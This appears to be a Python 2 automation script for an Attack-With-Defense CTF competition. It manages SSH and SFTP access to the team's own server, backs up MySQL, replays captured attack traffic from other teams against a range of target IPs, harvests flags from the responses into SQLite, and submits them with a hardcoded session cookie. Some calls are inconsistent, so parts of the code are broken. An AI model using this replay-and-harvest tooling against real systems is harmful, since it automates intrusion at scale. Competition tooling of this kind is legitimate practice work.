# coding:utf-8

# 作者：nealwe
# 时间：2018/12/7
# 需要实现的功能有 '下载远程flag文件'->'本地入库';

import sqlite3
import os
import sys
import paramiko
import re
import time
import json
import requests
import threading
from multiprocessing import Process
import hashlib
import base64

def ip_list(x):
    ipList = []
    iplist = x.split('.')
    if '-' in x:
        for i in iplist:
            d = i
            if '-' in d:
                p = iplist.index(d)
                l = d.split('-')
                m = int(l[0])
                n = int(l[1])
        for j in range(m, n + 1):
            iplist[p] = str(j)
            ip = '.'.join(iplist)
            ipList.append(ip)
        ipList = sorted(set(ipList), key=ipList.index)  # 去重
    else:
        ip = '.'.join(iplist)
        ipList.append(ip)
        ipList = sorted(set(ipList), key=ipList.index)
    return ipList

def md5(string):
    m = hashlib.md5()
    m.update(string)
    return m.hexdigest()

def headers_standard(headers):
    headers = headers.strip()
    headers = '"' + headers.replace(': ', '": "').replace('\n', '",\n"') + '",'
    return headers

def ALLFilePath(rootdir):
    allfile = []
    for dirpath, dirnames, filenames in os.walk(rootdir):
        for dir in dirnames:
            allfile.append(os.path.join(dirpath, dir))
        for name in filenames:
            allfile.append(os.path.join(dirpath, name))
    return allfile

class AWD(object):
    def __init__(self,IP,port,username,password,pkeyfile,local_file_path,remote_file_path,mysql_username,mysql_password):
        self.IP = IP
        self.port = int(port)
        self.username = username
        self.password = password
        try:
            self.pkey = paramiko.RSAKey.from_private_key_file(pkeyfile)
        except:
            self.pkey = ''
        self.mysql_username = mysql_username
        self.mysql_password = mysql_password
        self.local_file_path = local_file_path
        self.remote_file_path = remote_file_path  # 一定要在最后加'/'
        self.sshtransport = None
        self.sshclient = None
        self.sftp = None
        self.pkeyfile = pkeyfile
        pass

    def startup(self):
        if self.password != '':
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # 跳过了远程连接中选择‘是’的环节,
                ssh.connect(self.IP, self.port, self.username, self.password)
                self.sshclient = ssh
                print "[*]password-Client连接成功！"
                t = paramiko.Transport((self.IP, self.port))
                t.connect(username=self.username, password=self.password)
                self.sshtransport = t
                self.sftp = paramiko.SFTPClient.from_transport(self.sshtransport)
                print "[*]password-Transport连接成功！"
            except:
                print "[X]password-连接失败"
        elif self.pkey != '':
            # 先把pkeyfile给600权限
            os.system("chmod 600 {}".format(self.pkeyfile))
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # 跳过了远程连接中选择‘是’的环节,
                ssh.connect(self.IP, self.port, self.username, self.pkey)
                self.sshclient = ssh
                print "[*]pkey-Client连接成功"
                t = paramiko.Transport((self.IP, self.port))
                t.connect(username=self.username, pkey=self.pkey)
                self.sshtransport = t
                self.sftp = paramiko.SFTPClient.from_transport(self.sshtransport)
                print "[*]pkey-Transport连接成功！"
            except:
                print "[X]pkey-连接失败"
        else:
            print "[X funtion() startup error X]"

    def ALLFilePath(self,rootdir):
        allfile = []
        for dirpath, dirnames, filenames in os.walk(rootdir):
            for dir in dirnames:
                allfile.append(os.path.join(dirpath, dir))
            for name in filenames:
                allfile.append(os.path.join(dirpath, name))
        return allfile

    def UpoadLocalfile(self):
        print 'start upload files'
        local_all_files = self.ALLFilePath(local_file_path+"uploadfiles")
        for file in local_all_files:
            if "backforwad.tar.gz" in file:
                continue
            print '[*]uploading: \t', file, "\n\t\t\tto:\t---->\t",remote_file_path+file.split('/')[-1]
            self.sftp.put(file,remote_file_path+file.split('/')[-1])

    def UploadOnefile(self,file):
        print 'start upload file'
        print '[*]uploading: \t', file, "\n\t\t\tto:\t---->\t",remote_file_path+file.split('/')[-1]
        self.sftp.put(file,remote_file_path+file.split('/')[-1])

    def DownRemotefile(self,remotefile, localfile):
        self.sftp.get(remotefile, localfile)

    def RunPythonCommands_nealwe(self):
        try:
            stdin, stdout, stderr = self.sshclient.exec_command('ls {}'.format(remote_file_path))
            if "nealwe.py" in stdout.read():
                print "[*]upload end!\n\n\n[*]开始打包网站并部署waf\n\n\n"
                pycommand = 'python {}commands_nealwe.py {} '.format(remote_file_path,remote_file_path)
                _stdin, _stdout, _stderr = self.sshclient.exec_command(pycommand)
                print _stdout.read()
            else:
                print "[-]upload failed !"
                raw_input("回车继续")
        except:
            pass
        return 0

    def SSHexec(self,command):
        try:
            _stdin, _stdout, _stderr = self.sshclient.exec_command(command)
            print _stdout.read()
        except:
            pass
        return 0

    def RemoveWaf(self):
        try:
            stdin, stdout, stderr = self.sshclient.exec_command('cp /home/nealwe_ini.php /home/_waf+payload.php;cp /home/nealwe_ip_filter.php /home/_ip_filter.php;rm -rf /home/nealwe_ini.php /home/nealwe_ip_filter.php;touch -rf /home/nealwe_ini.php /home/nealwe_ip_filter.php;')
        except:
            print "[*]Method RemoveWaf() error!"
        pass

    def MysqlBackUp(self):
        mysql_username, mysql_password = '', ''
        try:
            tmp_open = open('mysql.txt', 'r')
            mysql_username, mysql_password = tmp_open.read().split(' ')
            tmp_open.close()
            print "mysql_username: \"{}\"\nmysql_password: \"{}\"".format(mysql_username, mysql_password)
            reset_flag = raw_input("需要重置Mysql用户名和密码吗?[y/n]")
        except:
            reset_flag = 'y'
            pass
        if reset_flag == 'y':
            mysql_username, mysql_password = raw_input("MYsql username\n"), raw_input("MYsql passwd\n")
            open('mysql.txt', 'w+').write(mysql_username + " " + mysql_password)
        if mysql_username == '' and mysql_password == '':
            print "请重新查找 mysql_username, mysql_password。"
            exit()
        try:
            stdin, stdout, stderr = self.sshclient.exec_command("mkdir {}backup/mysqlB/;mysqldump -u {} -p{} --all-databases > {}backup/mysqlB/all.sql; " .format(remote_file_path, mysql_username, mysql_password, remote_file_path))
            print stdout.read()
        except:
            print "error"

    def PcapBackUp(self):
        self.SSHexec("tar -zcvf /tmp/Pcaplogs.tar.gz /tmp/Pcaplogs/*")
        self.SSHexec("rm -rf /tmp/Pcaplogs/*")

    def PcapDownLoad(self):
        self.sftp.get('/tmp/Pcaplogs.tar.gz', os.path.join(local_file_path, 'Remotefiles/pcap/Pcaplogs.tar.gz'))
        print os.path.join(local_file_path, 'Remotefiles/pcap/Pcaplogs.tar.gz')

    def upload_nealweBackUp(self):
        self.SSHexec("tar -zcvf /tmp/upload_nealwe.tar.gz /tmp/upload_nealwe/*")
        self.SSHexec("rm -rf /tmp/upload_nealwe/*")

    def upload_nealweDownLoad(self):
        self.sftp.get('/tmp/upload_nealwe.tar.gz', os.path.join(local_file_path, 'Remotefiles/Attcker_upload_files/upload_nealwe.tar.gz'))
        print os.path.join(local_file_path, 'Remotefiles/Attcker_upload_files/upload_nealwe.tar.gz')

    def shutdown(self):
        if self.sshtransport:
            self.sshtransport.close()
            print '### disconnect sshtransport server: %s!' % self.IP
            self.sshtransport = None
        if self.sftp:
            self.sftp.close()
            print '### disconnect sftp server: %s!' % self.IP
            self.sftp = None
        if self.sshclient:
            self.sshclient.close()
            print '### disconnect sshclient server: %s!' % self.IP
            self.sshclient = None


            # 处理上传

    def headers_trans(self,headers):
        headers = headers.strip()
        headers = '"' + headers.replace(': ', '": "').replace('\n', '",\n"') + '",'
        return headers

    def run(self, ip, port, uri, method, headers, data, raw_data, file, file_line_num, upload_key, upload_filename, upload_type):
        LOG_recorded = 0
        tmp = flag_sql()
        # tmp = LOG_sql()
        # print method
        url = "http://" + ip.strip("\n") + ":" + port + "/" + uri
        res_content = ""

        if "POST" in method:
            try:
                if upload_filename.strip() == '':
                    uploadfiles = None
                    res = requests.post(url=url, headers=headers, data=json.loads(data), timeout=3)
                    pass
                else:
                    uploadfiles = {
                        base64.b64decode(upload_key): (
                            base64.b64decode(upload_filename), open(local_file_path+"Remotefiles/Attcker_upload_files/"+upload_filename, 'rb'),
                            base64.b64decode(upload_type))
                    }  # 文件型参数名参数，tuple中依次为文件名、文件内容、文件的Content-Type，不需要Content-Type可以不写
                    res = requests.post(url=url, headers=headers, data=json.loads(data), files=uploadfiles, timeout=3)

                # res = requests.post(url=url)
                res_content = res.content
                # print "123"
                if '20' not in str(res.status_code):
                    print "status not correct!"
                    return 0
            except:
                # print e
                print "-----"
                print uri
                print "-----"
                print url
                print "-----"
                print headers
                print "-----"
                print data
                print "-----"
                print uploadfiles
                res_content = ""
                print "POST error", url
        elif "GET" in method:
            try:
                res = requests.get(url=url, headers=headers, timeout=3)
                res_content = res.content
                if '20' not in str(res.status_code):
                    print res.status_code, url
                    return 0
            except:
                print ip, "down"
                res_content = ""
        # print url, method, res_content
        try:
            try:
                base64_sentence = re.findall(r"([a-zA-Z0-9+/=]{44})", res_content)[0]
                try:
                    likeflag_base64 = base64.b64decode(base64_sentence)
                    likeflag_base64 = re.findall(r"([a-zA-Z0-9+/={}]{32})", likeflag_base64)[0]
                except:
                    likeflag_base64 = base64_sentence

                # tmp = flag_sql()
                tmp.flag_insert(likeflag_base64[0])
                # tmp.end()
                # tmp = LOG_sql()
                LOG_recorded = tmp.LOG_insert(base64.b64encode(url), likeflag_base64[0], base64.b64encode(raw_data), base64.b64encode(res_content), file, file_line_num)
                # tmp.end()
            except:
                pass
            try:
                likeflag = re.findall(r"([a-fA-F0-9-]{32})", res_content)
                try:
                    # tmp = flag_sql()
                    tmp.flag_insert(likeflag[0])
                    # tmp.end()
                except:
                    pass
                if LOG_recorded == 0:
                    try:
                        # tmp = LOG_sql()
                        LOG_recorded = tmp.LOG_insert(base64.b64encode(url), likeflag[0], base64.b64encode(raw_data), base64.b64encode(res_content), file, file_line_num)
                        # tmp.end()
                    except:
                        LOG_recorded = 0
                        pass
            except:
                LOG_recorded = 0
                pass

        except:
            LOG_recorded = 0
            pass

        if "ZmxhZw==" in res_content.lower() or "base" in res_content.lower() or "phpinfo" in res_content.lower():
            # tmp = LOG_sql()
            tmp.LOG_insert(base64.b64encode(url), "ZmxhZw== flag", base64.b64encode(raw_data), base64.b64encode(res_content),file, file_line_num)
            # tmp.end()

        if "flag{" in res_content.lower():
            # tmp = LOG_sql()
            tmp.LOG_insert(base64.b64encode(url), "flag{", base64.b64encode(raw_data),
                           base64.b64encode(res_content),
                           file, file_line_num)
            # tmp.end()
        elif LOG_recorded == 0:
            # tmp = LOG_sql()
            LOG_recorded = tmp.LOG_insert(base64.b64encode(url), "record only", base64.b64encode(raw_data),
                           base64.b64encode(res_content),
                           file, file_line_num)
            # tmp.end()
        tmp.end()
        # tmp.end()
        return 0

    def AnalysePcap(self, myip, attackport, PcaplogsFolder, target_ips):
        files = self.ALLFilePath(PcaplogsFolder)
        # PcaplogsFolder,Attack_IPS_list  attack_IPS_2
        # tmp = open(Attack_IPS_list, 'r')
        # target_ips = target_ips
        # tmp.close()
        for file in files:
            if myip in file:
                print "[+]this is from my ip " + myip
                continue
            file_line_num = 0
            tmp__f = open(file, 'r')
            tmp_f = tmp__f.read()
            tmp__f.close()
            # print tmp_f
            for OnePcap in tmp_f.split('--------------------------'):
                raw_data = OnePcap
                if raw_data.strip('\n') == "":
                    continue

                uri = ""
                method = ""
                headers = {}
                data = """"""
                line_num = 1
                upload_key = ''
                upload_filename = ''
                upload_type = ''
                data_flag = 0
                for line in OnePcap.split('\r\n'):
                    # print line
                    # print raw_data
                    # print raw_input("raw_data")
                    file_line_num += 1
                    if line_num == 1:
                        line_num += 1
                        continue
                    if line_num == 2:
                        method = line.split(" /")[0]
                        try:
                            uri = re.findall(r"(.*?) HTTP/1.1", line.split(" /")[1])[0]
                        except:
                            uri = ''
                        try:
                            upload_key = re.findall(r"upload_key>>>(.*?)<<<", line)[0]
                            upload_filename = re.findall(r"upload_filename>>>(.*?)<<<", line)[0]
                            upload_type = re.findall(r"upload_type>>>(.*?)<<<", line)[0]
                        except:
                            pass
                        # upload_key, upload_filename, upload_type
                        line_num += 1
                        continue
                    if line.strip() != '' and data_flag == 0:
                        line_num += 1
                        name = line.split(': ')[0]
                        if "CONTENT-TYPE".lower() in name.lower():
                            continue
                        value = line.split(': ')[1]
                        headers[name] = value
                    else:
                        data_flag = 1
                    if line.strip() != '' and data_flag == 1:

                        data = data + '\n' + line
                for ip in target_ips:
                    print "ip:"+ip
                    # self.run(ip,attackport,uri,method,headers,data,raw_data)
                    # print data
                    p = Process(target=self.run, args=(ip, attackport, uri, method, headers, data, raw_data, file, file_line_num, upload_key, upload_filename, upload_type,))
                    print 'Process will start.'
                    p.start()

class flag_sql():
    def __init__(self):
        self.conn = sqlite3.connect('{}AWD_nealwe_sqlite.sqlite'.format(local_file_path))
        self.c = self.conn.cursor()
        # print "Opened database successfully"
    def flag_insert(self,ip,flag):
        if len(flag) < 25:
            return 0
        sql = """INSERT INTO "main"."AWD_FLAG" ("ip","flag") VALUES ("{}","{}")""".format(ip, flag)
        print sql
        self.c.execute(sql)
        self.conn.commit()
        print "Records created successfully"
        return 1
    def flag_select(self):
        cursor = self.c.execute("select id,ip,flag from AWD_FLAG where submit = 0 and outtime = 0 and julianday('now')*86400-julianday(intime)*86400 < 300")
        flags = []
        for row in cursor:
            print "id = ", row[0]
            print "ip = ", row[1]
            print "flag = ", row[2], "\n"
            flags.append(row[1]+"#&&#"+row[2])
        print "Operation done successfully"
        return flags
    def flag_update(self, flag):
        self.c.execute("UPDATE AWD_FLAG SET outtime = datetime('now') where flag = '{}'".format(flag))
        self.conn.commit()
        print "Total number of rows updated :", self.conn.total_changes
    def flag_delete(self, flag):
        self.c.execute("DELETE from COMPANY where ID=2;")
        self.conn.commit()
        print "Total number of rows deleted :", self.conn.total_changes
    def LOG_insert(self,url,flag,send_data,res_data,filepath,line):
        if len(flag) < 20:
            # print "Record length is too short!"
            return 0
        sql = """INSERT INTO "main"."AWD_LOG" ("url","flag","send_data","res_data","file","line") VALUES ("{}","{}","{}","{}","{}","{}")""".format(url, flag, send_data, res_data, filepath, line)
        # print sql
        self.c.execute(sql)
        self.conn.commit()
        print "LOG_insert successfully"
        return 1
    def LOG_select(self):
        cursor = self.c.execute("select id,flag from AWD_FLAG where submit = 0 and outtime = 0 and julianday('now')*86400-julianday(intime)*86400 < 300")
        for row in cursor:
            print "id = ", row[0]
            print "flag = ", row[1], "\n"
        # print "Operation done successfully"
    def LOG_update(self, flag):
        self.c.execute("UPDATE AWD_FLAG SET outtime = datetime('now') where flag = '{}'".format(flag))
        self.conn.commit()
        print "[*] Total number of rows updated :", self.conn.total_changes
    def LOG_delete(self, flag):
        self.c.execute("DELETE from COMPANY where ID=2;")
        self.conn.commit()
        print "[*] Total number of rows deleted :", self.conn.total_changes
    def end(self):
        self.conn.close()
        print "[*] conn end"


    # 插入
    # INSERT INTO "main"."AWD_FLAG" ("flag") VALUES ("test444")
    # 选择出flag
    # select id,flag from AWD_FLAG where submit = 0 and outtime = 0 and julianday('now')*86400-julianday(intime)*86400 < 300
    # UPDATE AWD_FLAG SET outtime = datetime('now') where id = 1
    #
    #
        pass

def sendflag():
    tmp = flag_sql()
    flags = tmp.flag_select()
    for flag in flags:
        url = ""
        cookie = """"""
        headers2 = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0",
                    "Accept": "*/*",
                    "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": "http://10.111.0.132/index.php?s=/Admin/Config/group.html",
                    "Content-Length": "333",
                    "Cookie": cookie,
                    "X-Forwarded-For": "127.0.0.1",
                    "Connection": "close", }
        data_flag = "flag_content=%s" % flag
        print requests.post(url=url, headers=headers2, data=data_flag).content
        tmp.flag_update(flag)
    tmp.end()

def mkdir(path):
    # 引入模块
    import os

    # 去除首位空格
    path = path.strip()
    # 去除尾部 \ 符号
    path = path.rstrip("/")

    # 判断路径是否存在
    # 存在     True
    # 不存在   False
    isExists = os.path.exists(path)

    # 判断结果
    if not isExists:
        # 如果不存在则创建目录
        # 创建目录操作函数
        os.makedirs(path)
        return True
    else:
        # 如果目录存在则不创建，并提示目录已存在
        # print path + ' 目录已存在'
        return False

if __name__ == "__main__" :

    flag_remote_path = "/tmp/.webshell_flags"
    flag_local_path = "./flags/flags.txt"


    ctf_name = "pcb"
    webnum = '0'
    local_file_path = 'CTFs/{}/{}/'.format(ctf_name, webnum)
    PcaplogsFolder = local_file_path + "Remotefiles/pcap/tmp/Pcaplogs/"
    # Attack_IPS_list = local_file_path + "Config/IPS_list.txt"
    # tmp_my_ssh = open(local_file_path + 'Config/ssh.txt', 'r')
    # my_ssh = tmp_my_ssh.read().split(',')
    # tmp_my_ssh.close()
    # IP, port, username, password, pkeyfile, remote_file_path = my_ssh[0], my_ssh[1], my_ssh[2], my_ssh[3], my_ssh[4], my_ssh[5]
    # mysql_username = ''
    # mysql_password = ''
    # a = AWD(IP=IP, port=port, username=username, password=password, pkeyfile=pkeyfile,
    #         local_file_path=local_file_path, remote_file_path=remote_file_path, mysql_username=mysql_username,
    #         mysql_password=mysql_password)
    # a.startup()
    flag_class = flag_sql()
    count = 0
    while True:
        count += 1
        print "[*]count: " + str(count)
        # try:
        #     # a.DownRemotefile(flag_remote_path, flag_local_path)
        #     os.system('cp {} {}'.format(flag_remote_path, flag_local_path))
        # except:
        #     "[x]ssh error"
        f = open(flag_local_path, 'r')
        for line in f.readlines():
            print(line)
            line = line.strip('\n')
            gettime = line.split("#&&#")[0]
            ip = line.split("#&&#")[1]
            flag = line.split("#&&#")[2]
            print gettime+'\t'+ip+'\t'+flag
            try:
                url = "http://172.91.1.12:9090/ad/hacker/submit/submitCode"
                cookie = "JSESSIONID=331EEBB422B1FC23B2BDFFED986062C4"
                headers = {
                    "Host": "172.91.1.12:9090",
                    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0",
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Referer": "http://172.91.1.12:9090/arace/index",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Length": "8",
                    "Cookie": cookie,
                    "Connection": "keep-alive"
                }
                data = "flag={}"
                # print requests.post(url=url, headers=headers, data=data.format(flag)).content
                # time.sleep(0.5)
                print(flag)
                flag_class.flag_insert(ip=ip, flag=flag)
            except:
                print "[..]UNIQUE FLAG"
        f.close()
        time.sleep(2)

